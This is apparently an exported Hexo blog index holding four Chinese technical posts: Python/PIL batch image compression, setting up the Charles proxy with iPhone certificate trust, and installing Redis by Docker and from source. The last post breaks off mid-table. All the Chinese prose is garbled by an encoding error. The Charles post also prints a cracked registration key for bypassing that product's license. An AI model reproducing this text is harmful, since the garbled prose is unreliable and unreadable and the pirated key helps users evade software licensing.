  <entry>
    <title>python-ä½¿ç”¨PILæ‰¹é‡å‹ç¼©å›¾ç‰‡</title>
    <url>/2021/01/09/py-image-compres/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;ä»Šå¤©è¿ç§»æ–‡ä»¶ï¼Œéœ€è¦å¯¹å¤§é‡çš„å›¾ç‰‡è¿›è¡Œå‹ç¼©ï¼Œç”¨PSä¸€å¼ ä¸€å¼ çš„å¤„ç†æ•ˆç‡ç‰¹åˆ«ä½ï¼Œè€Œåœ¨ç½‘ä¸Šçš„åœ¨çº¿å·¥å…·æ‰¹é‡å¤„ç†å‡ ä¹éƒ½æ˜¯æ”¶è´¹çš„ï¼Œæ‰€ä»¥å¹²è„†ç”¨pythonè„šæœ¬æ¥å¤„ç†ï¼Œä¸€åŠ³æ°¸é€¸ï¼Œä»¥åä¹Ÿæ–¹ä¾¿è‡ªå·±ä½¿ç”¨ã€‚</p>
<h4 id="å®‰è£…PILå›¾åƒå¤„ç†åº“"><a href="#å®‰è£…PILå›¾åƒå¤„ç†åº“" class="headerlink" title="å®‰è£…PILå›¾åƒå¤„ç†åº“"></a>å®‰è£…PILå›¾åƒå¤„ç†åº“</h4><p><code>PIL</code>æ˜¯ä¸€ä¸ª<code>Python</code>å›¾åƒå¤„ç†åº“ï¼Œ<code>Pillow</code>æ˜¯<code>PIL</code>çš„ä¸€ä¸ªå¾ˆå‹å¥½çš„åˆ†æ”¯ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å®‰è£…<code>Pillow</code>æ¥ä½¿ç”¨<code>PIL</code>ã€‚æ–‡æ¡£ï¼š<a href="https://pillow-cn.readthedocs.io/zh_CN/latest/index.html">pillowå®˜ç½‘</a></p>
<p>æˆ‘ä½¿ç”¨çš„æ˜¯macç”µè„‘ï¼Œä»¥ä¸‹å‘½ä»¤åœ¨macä¸Šæ‰§è¡Œã€‚</p>
<p>1ï¼Œå®‰è£…pipå·¥å…·ï¼Œå¦‚æœå·²ç»å®‰è£…ï¼Œè·³è¿‡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo easy_install pip</span><br></pre></td></tr></table></figure>
<p>2ï¼Œå®‰è£…Pillowï¼Œå€ŸåŠ©pipå·¥å…·å®‰è£…èµ·æ¥ä¹Ÿå¾ˆç®€å•</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install Pillow</span><br></pre></td></tr></table></figure>
<h4 id="å‹ç¼©ä»£ç ç¤ºä¾‹"><a href="#å‹ç¼©ä»£ç ç¤ºä¾‹" class="headerlink" title="å‹ç¼©ä»£ç ç¤ºä¾‹"></a>å‹ç¼©ä»£ç ç¤ºä¾‹</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#!coding=utf-8</span></span><br><span class="line"><span class="comment">#author=guolin</span></span><br><span class="line"><span class="comment">#ä¾èµ–ï¼špip install Pillow</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°ºå¯¸æ¯”ä¾‹</span></span><br><span class="line">size_ratio = <span class="number">0.3</span></span><br><span class="line"><span class="comment"># å‹ç¼©è´¨é‡</span></span><br><span class="line">quality = <span class="number">50</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># éå†æ–‡ä»¶å¤¹å‹ç¼©</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">batch_compress</span>(<span class="params">srcPath, distPath</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># éå†æ–‡ä»¶å¤¹</span></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(srcPath):</span><br><span class="line">        <span class="comment"># ç›®å½•éªŒè¯</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(distPath):</span><br><span class="line">            os.makedirs(distPath)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ‹¼æ¥å®Œæ•´çš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹è·¯å¾„</span></span><br><span class="line">        srcFile = os.path.join(srcPath, filename)</span><br><span class="line">        distFile = os.path.join(distPath, filename)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å¦‚æœæ˜¯æ–‡ä»¶ å°±è°ƒç”¨å‹ç¼©</span></span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(srcFile):</span><br><span class="line">            <span class="keyword">if</span>(is_image(srcFile)):</span><br><span class="line">                <span class="comment"># æ‰§è¡Œå‹ç¼©æ“ä½œ</span></span><br><span class="line">                compression(srcFile,distFile)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (distFile + <span class="string">&quot; æ–‡ä»¶ä¸æ˜¯å›¾ç‰‡ï¼Œè·³è¿‡ï¼&quot;</span>)</span><br><span class="line">        <span class="comment"># å¦‚æœæ˜¯æ–‡ä»¶å¤¹ å°±ç»§ç»­é€’å½’</span></span><br><span class="line">        <span class="keyword">elif</span> os.path.isdir(srcFile):</span><br><span class="line">            batch_compress(srcFile, distFile)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–‡ä»¶æ˜¯å¦ä¸ºå›¾ç‰‡åˆ¤æ–­</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_image</span>(<span class="params">srcFile</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (srcFile.lower().endswith((<span class="string">&#x27;.bmp&#x27;</span>, <span class="string">&#x27;.dib&#x27;</span>,<span class="string">&#x27;.gif&#x27;</span>, <span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;.jpeg&#x27;</span>, <span class="string">&#x27;.pbm&#x27;</span>, <span class="string">&#x27;.pgm&#x27;</span>, <span class="string">&#x27;.ppm&#x27;</span>, <span class="string">&#x27;.tif&#x27;</span>, <span class="string">&#x27;.tiff&#x27;</span>))):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å‹ç¼©å›¾ç‰‡å¹¶ä¿å­˜</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compression</span>(<span class="params">srcFile,distFile</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># è¯»å–åŸå›¾</span></span><br><span class="line">        srcImg = Image.<span class="built_in">open</span>(srcFile)</span><br><span class="line">        w, h = srcImg.size</span><br><span class="line">        <span class="comment"># é‡æ–°è®¾ç½®å›¾ç‰‡å°ºå¯¸å’Œé€‰é¡¹ï¼ŒImage.ANTIALIASï¼šå¹³æ»‘æŠ—é”¯é½¿</span></span><br><span class="line">        distImg = srcImg.resize((<span class="built_in">int</span>(w * size_ratio), <span class="built_in">int</span>(h * size_ratio)), Image.ANTIALIAS)</span><br><span class="line">        <span class="comment"># ä¿å­˜ä¸ºæ–°å›¾</span></span><br><span class="line">        distImg.save(distFile, quality=quality)</span><br><span class="line">        <span class="built_in">print</span> (distFile + <span class="string">&quot; å‹ç¼©æˆåŠŸï¼&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span> (distFile + <span class="string">&quot; å‹ç¼©å¤±è´¥ï¼å¼‚å¸¸ä¿¡æ¯ï¼š&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;=================å¼€å§‹æ‰§è¡Œ=================&quot;</span>)</span><br><span class="line">    <span class="comment"># æŒ‡å®šå›¾ç‰‡ç›®å½•ä»¥åŠå‹ç¼©åçš„å›¾ç‰‡ç›®å½•</span></span><br><span class="line">    batch_compress(<span class="string">&quot;/Users/mac/Downloads/images&quot;</span>, <span class="string">&quot;/Users/mac/Downloads/images/dist&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;=================æ‰§è¡Œç»“æŸ=================&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>å‹ç¼©å›¾ç‰‡</tag>
      </tags>
  </entry>
  <entry>
    <title>mac charlesæŠ“åŒ…å·¥å…·å®‰è£…è®¾ç½®</title>
    <url>/2020/08/01/mac-charles-install/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;ä½œä¸ºå¼€å‘ï¼Œä¸€æ¬¾æŠ“åŒ…å·¥å…·ï¼Œè‡ªç„¶æ˜¯å¿…ä¸å¯å°‘ã€‚<code>charles</code>æ˜¯ä¸€æ¬¾éå¸¸ä¼˜ç§€çš„æŠ“åŒ…å·¥å…·ï¼Œæ”¶è´¹ï¼Œä½†ä¹Ÿä»…ä»…æ˜¯å¯åŠ¨å¤šäº†ä¸€äº›å¹¿å‘Šå’Œä½¿ç”¨æ—¶é—´é™åˆ¶ï¼Œæ‰€ä»¥åŸºæœ¬ä¸ä¼šå½±å“ä½¿ç”¨ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æ¼”ç¤ºç¯å¢ƒï¼š</span><br><span class="line">ç”µè„‘ï¼šmac</span><br><span class="line">æ‰‹æœºï¼šiphone</span><br></pre></td></tr></table></figure>
<h4 id="å·¥å…·å®‰è£…å’Œè®¾ç½®"><a href="#å·¥å…·å®‰è£…å’Œè®¾ç½®" class="headerlink" title="å·¥å…·å®‰è£…å’Œè®¾ç½®"></a>å·¥å…·å®‰è£…å’Œè®¾ç½®</h4><h5 id="å·¥å…·ä¸‹è½½"><a href="#å·¥å…·ä¸‹è½½" class="headerlink" title="å·¥å…·ä¸‹è½½"></a>å·¥å…·ä¸‹è½½</h5><p>å®˜æ–¹ä¸‹è½½åœ°å€ï¼š<a href="https://www.charlesproxy.com/download/">https://www.charlesproxy.com/download/</a></p>
<p>macé€‰æ‹©dmgæ ¼å¼çš„å®‰è£…æ–‡ä»¶ï¼Œä¸‹è½½åï¼Œç›´æ¥åŒå‡»å®‰è£…å³å¯ã€‚</p>
<p>å®‰è£…å®Œæˆåï¼Œç›´æ¥æ‰“å¼€å¯èƒ½ä¼šæç¤ºæƒé™åªè¯»çš„é”™è¯¯ä¿¡æ¯ï¼Œå¦‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Charles cannot configure your proxy settings while it is on a read-only volume.</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤è¿›è¡Œæˆæƒå³å¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo chown -R root <span class="string">&quot;/Applications/Charles.app/Contents/Resources&quot;</span></span><br><span class="line">sudo chmod -R u+s <span class="string">&quot;/Applications/Charles.app/Contents/Resources&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="å·¥å…·å®‰è£…ç ´è§£"><a href="#å·¥å…·å®‰è£…ç ´è§£" class="headerlink" title="å·¥å…·å®‰è£…ç ´è§£"></a>å·¥å…·å®‰è£…ç ´è§£</h5><p>å·¥å…·å®‰è£…åï¼Œå…¶å®ä¸éœ€è¦å»æ“å¿ƒä»˜è´¹æˆ–ç ´è§£çš„äº‹ï¼Œå®ƒæä¾›çš„å…è´¹ä½¿ç”¨æœºåˆ¶ å…¶å®è¶³å¤Ÿæˆ‘ä»¬æ­£å¸¸ä½¿ç”¨ã€‚</p>
<p>ä¸è¿‡ï¼Œä¼Ÿå¤§çš„äº’è”ç½‘æ°‘ä¼—é‡Œï¼Œæ€»æœ‰é‚£ä¹ˆäº›äººï¼Œä¸ºäº†è®©æˆ‘ä»¬æœ‰æ›´å¥½çš„ä½“éªŒè€ŒåŠªåŠ›ğŸ˜‚ã€‚<br>åˆ° <a href="https://zhile.io/2017/07/07/charles-proxy-usage-and-license.html">zhile.ioç«™ç‚¹</a> è·å–æ³¨å†Œç ã€‚</p>
<p>æ³¨å†Œç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Registered Name:  https:&#x2F;&#x2F;zhile.io</span><br><span class="line">License Key:   48891cf209c6d32bf4</span><br></pre></td></tr></table></figure>

<h5 id="å·¥å…·ä»£ç†è®¾ç½®"><a href="#å·¥å…·ä»£ç†è®¾ç½®" class="headerlink" title="å·¥å…·ä»£ç†è®¾ç½®"></a>å·¥å…·ä»£ç†è®¾ç½®</h5><p>æ‰“å¼€èœå•ï¼š<code>Proxy &gt;&gt; SSL Proxying Settings...</code></p>
<p>ä¿®æ”¹<code>SSL Proxying</code>é…ç½®ï¼š</p>
<p>1ï¼Œé’©ä¸Š <code>Enable SSL Proxying</code> é…ç½®</p>
<p>2ï¼Œæ·»åŠ  <code>Location</code>é…ç½®ï¼ŒHostå’ŒPortéƒ½ä¸è¦å¡«ï¼Œç›´æ¥æ–°å¢ï¼Œè¿™æ ·çš„ç»“æœæ˜¯ï¼š<code>*</code> åŒ¹é…æ‰€æœ‰ï¼Œå¦‚å›¾ï¼š</p>
<image src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/charles/charles01.png" width=500>

<h4 id="æ‰‹æœºè¯ä¹¦å®‰è£…"><a href="#æ‰‹æœºè¯ä¹¦å®‰è£…" class="headerlink" title="æ‰‹æœºè¯ä¹¦å®‰è£…"></a>æ‰‹æœºè¯ä¹¦å®‰è£…</h4><p>1ï¼Œæ‰“å¼€ charleså·¥å…·çš„è¯ä¹¦å®‰è£…èœå•ï¼Œé€‰æ‹©æ‰‹æœºè¯ä¹¦å®‰è£…ã€‚</p>
<p>å…·ä½“è·¯å¾„ï¼š<code>Help &gt;&gt; SSL Proxying &gt;&gt; Install Charles Root Certificate on a Mobile Device or Remote Browser</code></p>
<p>ç‚¹å‡»åï¼Œä¼šæç¤ºä½ å¦‚ä¸‹ä¿¡æ¯ï¼Œæ ¹æ®æç¤ºè¿›è¡Œä¸‹ä¸€æ­¥é…ç½®ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Configure your device to use Charles as its HTTP proxy on 172.18.4.105:8888, </span><br><span class="line">then browse to chls.pro&#x2F;ssl to download and install the certificate.</span><br><span class="line"></span><br><span class="line">Note that on iOS 10 and later you must then go into Settings &gt; General &gt; About </span><br><span class="line">&gt; Certificate Trust Settings and enable the Charles certificate to be trusted.</span><br></pre></td></tr></table></figure>
<p>2ï¼Œæ‰‹æœºæ·»åŠ ä»£ç†ï¼Œé¦–å…ˆç¡®ä¿iphoneå’Œmacè¿æ¥çš„æ˜¯åŒä¸€ä¸ªWi-Fiï¼Œç„¶ååˆ°Wi-Fiè®¾ç½®é‡Œæ·»åŠ ä»£ç†é…ç½®ï¼Œipå’Œç«¯å£å°±æ˜¯ä¸Šé¢æ‰€æç¤ºçš„ï¼š<code>xx.xx.xx.xx:8888</code>ã€‚</p>
<p>3ï¼Œæ‰‹æœºè¯ä¹¦ä¸‹è½½ï¼Œæµè§ˆå™¨æ‰“å¼€ç½‘å€ï¼š<code>chls.pro/ssl</code>ï¼Œä¸‹è½½è¯ä¹¦æ–‡ä»¶ã€‚</p>
<p>4ï¼Œæ‰‹æœºè¯ä¹¦å®‰è£…ï¼Œåˆ°è·¯å¾„ï¼š<code>è®¾ç½® &gt;&gt; é€šç”¨ &gt;&gt; æè¿°æ–‡ä»¶</code>ï¼Œé€‰æ‹© <code>Charles Proxy CA ***</code> æ–‡ä»¶ï¼Œç‚¹å‡»<code>å®‰è£…</code></p>
<p>5ï¼Œæ‰‹æœºè¯ä¹¦ä¿¡ä»»ï¼Œåˆ°è·¯å¾„ï¼š<code>è®¾ç½® &gt;&gt; é€šç”¨ &gt;&gt; å…³äºæœ¬æœº &gt;&gt; è¯ä¹¦ä¿¡ä»»è®¾ç½®</code>ï¼Œå¼€å¯ <code>Charles Proxy CA ***</code> è¯ä¹¦å³å¯ã€‚</p>
<p>å¥½äº†ï¼Œåˆ°ç°åœ¨ï¼Œæ‰€æœ‰é…ç½®å°±å®Œæˆäº†ï¼Œå¯ä»¥æ­£å¸¸æŠ“åŒ…äº†ã€‚</p>
]]></content>
      <categories>
        <category>mac</category>
      </categories>
      <tags>
        <tag>charles</tag>
        <tag>æŠ“åŒ…</tag>
      </tags>
  </entry>
  <entry>
    <title>Redisä¸“æ -ä½¿ç”¨Dockerå•æœºéƒ¨ç½²Redis</title>
    <url>/2020/10/01/redis-docker-install/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;å¦‚æœéè¦é—®æ€ä¹ˆå®‰è£…Redisæœ€çœå¿ƒã€æœ€ç®€å•ï¼Œé‚£è‚¯å®šè¦å±<code>Docker</code>é•œåƒå®‰è£…äº†ã€‚</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;docker hubé•œåƒä»“åº“ä¸­ï¼Œæœ‰æ— æ•°çš„å¼€å‘è€…è´¡çŒ®äº†æ— æ•°çš„é•œåƒï¼Œå¯ä¾›é€‰æ‹©ï¼Œåªéœ€è¦ä¸€è¡Œdockerå‘½ä»¤ï¼Œå³å¯å¿«é€Ÿå®Œæˆéƒ¨ç½²ã€‚ä¸è¿‡è¦æ³¨æ„çš„æ˜¯ï¼Œæœ€å¥½é€‰æ‹©å¸¦æœ‰<code>OFFICIAL IMAGE</code>æ ‡å¿—çš„å®˜æ–¹é•œåƒï¼Œå®‰å…¨å¯é ï¼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rediså®˜æ–¹é•œåƒä»“åº“åœ°å€ï¼šhttps:&#x2F;&#x2F;hub.docker.com&#x2F;_&#x2F;redis</span><br></pre></td></tr></table></figure>

<h4 id="éƒ¨ç½²è¿‡ç¨‹"><a href="#éƒ¨ç½²è¿‡ç¨‹" class="headerlink" title="éƒ¨ç½²è¿‡ç¨‹"></a>éƒ¨ç½²è¿‡ç¨‹</h4><h5 id="docker-runéƒ¨ç½²"><a href="#docker-runéƒ¨ç½²" class="headerlink" title="docker runéƒ¨ç½²"></a>docker runéƒ¨ç½²</h5><p><code>docker run</code>å‘½ä»¤çš„ä½œç”¨æ˜¯åˆ›å»ºä¸€ä¸ªæ–°çš„å®¹å™¨å¹¶è¿è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢çš„å‘½ä»¤å¿«é€Ÿå¯åŠ¨RedisæœåŠ¡ï¼Œä»¥åŠæŒ‡å®šç›¸å…³çš„å‘½ä»¤æˆ–è‡ªå®šä¹‰é…ç½®æ–‡ä»¶ã€‚</p>
<p>æŒ‡å®šå‚æ•°å¯åŠ¨ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --name some-redis -d redis:6.0.9 redis-server --appendonly yes --requirepass <span class="string">&quot;password123&quot;</span></span><br></pre></td></tr></table></figure>
<p>æŒ‡å®šé…ç½®æ–‡ä»¶å¯åŠ¨ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -v /myredis/conf:/usr/<span class="built_in">local</span>/etc/redis --name some-redis -d redis:6.0.9 redis-server /usr/<span class="built_in">local</span>/etc/redis/redis.conf</span><br></pre></td></tr></table></figure>
<p>åœæ­¢ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop some-redis</span><br></pre></td></tr></table></figure>
<p>é‡å¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker start some-redis</span><br></pre></td></tr></table></figure>

<h5 id="docker-composeéƒ¨ç½²"><a href="#docker-composeéƒ¨ç½²" class="headerlink" title="docker-composeéƒ¨ç½²"></a>docker-composeéƒ¨ç½²</h5><p><code>docker-compose</code>æ˜¯dockerçš„è‡ªå·±å®¶çš„æœåŠ¡ç¼–æ’å·¥å…·ï¼Œä¸»è¦æ˜¯ç”¨æ¥æ„å»ºå¤šä¸ªæœ‰å…³è”çš„æœåŠ¡ï¼Œé€šè¿‡å®ƒï¼Œè®©æˆ‘ä»¬ç®¡ç†å®¹å™¨å˜å¾—æ›´åŠ çš„å¾—å¿ƒåº”æ‰‹ã€‚ä¸è¿‡ï¼Œä¸€èˆ¬å•ä¸ªæœåŠ¡ï¼Œæˆ‘ä»¬ä¹Ÿä¼šé€‰æ‹©ç”¨å®ƒæ¥æ„å»ºã€‚</p>
<p>docker-compose.ymlï¼š</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># redis ç¼“å­˜æ•°æ®åº“</span></span><br><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">   <span class="attr">redis:</span></span><br><span class="line">     <span class="attr">image:</span> <span class="string">redis:6.0.9</span></span><br><span class="line">     <span class="attr">container_name:</span> <span class="string">some-redis</span></span><br><span class="line">     <span class="attr">volumes:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">data:/my/own/redis/data</span></span><br><span class="line">     <span class="attr">ports:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">&quot;6379:6379&quot;</span></span><br><span class="line">     <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">     <span class="attr">command:</span>  <span class="string">redis-server</span> <span class="string">--appendonly</span> <span class="literal">yes</span> <span class="string">--requirepass</span> <span class="string">&quot;password123&quot;</span></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">data:</span></span><br></pre></td></tr></table></figure>
<p>æ„å»ºå¯åŠ¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>åœæ­¢ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose stop</span><br></pre></td></tr></table></figure>
<p>é‡å¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose restart</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>docker</category>
        <category>redis</category>
      </categories>
      <tags>
        <tag>åˆ†å¸ƒå¼ç¼“å­˜</tag>
        <tag>ç¼“å­˜</tag>
        <tag>nosql</tag>
      </tags>
  </entry>
  <entry>
    <title>Redisä¸“æ -å•æœºéƒ¨ç½²Redis</title>
    <url>/2020/10/01/redis-sign-install/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>å•æœºéƒ¨ç½²rediséå¸¸ç®€å•ï¼Œåªéœ€è¦å®‰è£…å¥½å¯¹åº”çš„ä¾èµ–ï¼Œç„¶åä¸‹è½½redisæºä»£ç ï¼Œä½¿ç”¨<code>make</code>å‘½ä»¤ï¼Œæå–å’Œç¼–è¯‘Rediså³å¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å®‰è£…ç¯å¢ƒï¼šcentos</span><br><span class="line"></span><br><span class="line">å®‰è£…æ–¹å¼å‚è€ƒï¼šhttps:&#x2F;&#x2F;redis.io&#x2F;download</span><br><span class="line"></span><br><span class="line">å®‰è£…åŒ…ä¸‹è½½åœ°å€ï¼šhttp:&#x2F;&#x2F;download.redis.io&#x2F;releases</span><br></pre></td></tr></table></figure>
<h4 id="éƒ¨ç½²è¿‡ç¨‹"><a href="#éƒ¨ç½²è¿‡ç¨‹" class="headerlink" title="éƒ¨ç½²è¿‡ç¨‹"></a>éƒ¨ç½²è¿‡ç¨‹</h4><h5 id="ä¾èµ–å®‰è£…"><a href="#ä¾èµ–å®‰è£…" class="headerlink" title="ä¾èµ–å®‰è£…"></a>ä¾èµ–å®‰è£…</h5><p>1ï¼Œå®‰è£…tclã€gccç­‰ä¾èµ–</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install tcl</span><br><span class="line">yum install gcc - c++</span><br></pre></td></tr></table></figure>
<p>2ï¼Œå‡çº§gccç‰ˆæœ¬ï¼Œå¹¶è®¾ç½®ç¯å¢ƒå˜é‡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install centos-release-scl</span><br><span class="line">yum -y install devtoolset-9-gcc devtoolset-9-gcc-c++ devtoolset-9-binutils</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;source /opt/rh/devtoolset-9/enable&quot;</span> &gt;&gt; /etc/profile</span><br><span class="line">// æˆ– ä»…ä¸´æ—¶ä½¿ç”¨é«˜ç‰ˆæœ¬çš„gcc</span><br><span class="line">scl <span class="built_in">enable</span> devtoolset-9 bash</span><br></pre></td></tr></table></figure>

<h5 id="Rediså®‰è£…"><a href="#Rediså®‰è£…" class="headerlink" title="Rediså®‰è£…"></a>Rediså®‰è£…</h5><p>1ï¼Œä¸‹è½½redisï¼Œåˆ°<code>http://download.redis.io/releases</code>é€‰æ‹©æ‰€éœ€çš„ç‰ˆæœ¬ä¸‹è½½</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"></span><br><span class="line">wget http://download.redis.io/releases/redis-6.0.9.tar.gz</span><br><span class="line"></span><br><span class="line">tar -zxvf redis-6.0.9.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> redis-6.0.9</span><br></pre></td></tr></table></figure>
<p>2ï¼Œæ‰§è¡Œmakeï¼Œå®Œæˆå®‰è£…</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">make install PREFIX=/usr/<span class="built_in">local</span>/redis</span><br></pre></td></tr></table></figure>
<p>æ³¨ï¼šå®‰è£…å®Œæˆåï¼Œ<code>redis-benchmark</code>ã€<code>redis-check-aof</code>ã€<code>redis-check-rdb</code>ã€<code>redis-cli</code>ã€<code>redis-sentinel</code>ã€<code>redis-server</code> éƒ½ä¼šè¢«å¤åˆ¶åˆ°<code>/usr/local/redis/bin</code>ç›®å½•ä¸‹ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚</p>
<h5 id="æœ€å¸¸ç”¨é…ç½®"><a href="#æœ€å¸¸ç”¨é…ç½®" class="headerlink" title="æœ€å¸¸ç”¨é…ç½®"></a>æœ€å¸¸ç”¨é…ç½®</h5><p>0ï¼Œä¸ºäº†æ–¹ä¾¿ç®¡ç†ï¼Œä¸€èˆ¬ï¼Œæˆ‘ä»¬ä¼šæŠŠé…ç½®æ–‡ä»¶ä¹Ÿæ‹·è´åˆ°<code>/usr/local/redis/bin/</code>ç›®å½•ä¸‹ï¼Œç„¶åä¿®æ”¹æ­¤ç›®å½•ä¸‹çš„æ–‡ä»¶æ¥è¿›è¡Œç›¸å…³é…ç½®ã€‚ä¸è¿‡éšä½ ï¼Œå“ªéƒ½ä¸€æ ·ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp /root/redis-6.0.9/redis.conf /usr/<span class="built_in">local</span>/redis/bin/redis.conf</span><br></pre></td></tr></table></figure>
<p>1ï¼Œé…ç½®redisè®¿é—®å¯†ç ï¼Œåªéœ€è¦ä¿®æ”¹<code>redis.conf</code>çš„<code>requirepass</code>å‚æ•°å³å¯ã€‚<br>è®¾ç½®redisè®¿é—®å¯†ç : </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">requirepass &lt;å¯†ç &gt;</span><br></pre></td></tr></table></figure>
<p>Â </p>
<p>2ï¼Œé…ç½®å®ˆæŠ¤è¿›ç¨‹å¯åŠ¨ï¼ŒåŒæ ·åœ¨<code>redis.conf</code>æ–‡ä»¶ä¸­ä¿®æ”¹<code>daemonize yes</code>å³å¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">daemonize yes</span><br></pre></td></tr></table></figure>
<p>Â <br>3ï¼Œæœ€å¤§å†…å­˜è®¾ç½®ï¼Œé»˜è®¤æ˜¯æ³¨é‡Šçš„ï¼Œå•ä½æ˜¯<code>byte</code>å­—èŠ‚ï¼Œå¦‚æœè¶…å‡ºè¿™ä¸ªæœ€å¤§é™åˆ¶ï¼ŒRedisä¼šæ ¹æ®<code>é€å‡ºç­–ç•¥</code>å°è¯•åˆ é™¤KEYï¼Œå¦‚æœé…ç½®çš„æ˜¯ä¸é€å‡ºä»»ä½•å†…å®¹çš„ç­–ç•¥ï¼Œé‚£ä¹ˆå°†ç›´æ¥æç¤ºå†™æ“ä½œé”™è¯¯ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">maxmemory &lt;bytes&gt;</span><br></pre></td></tr></table></figure>
<p>é€å‡ºç­–ç•¥é…ç½®æ–¹å¼ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">maxmemory-policy &lt;ç­–ç•¥&gt;</span><br></pre></td></tr></table></figure>
<p>å¯é€‰ç­–ç•¥ï¼š</p>
<table>
<thead>
<tr>
<th>ç­–ç•¥åç§°</th>
<th>ç­–ç•¥æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>volatile-lru</td>
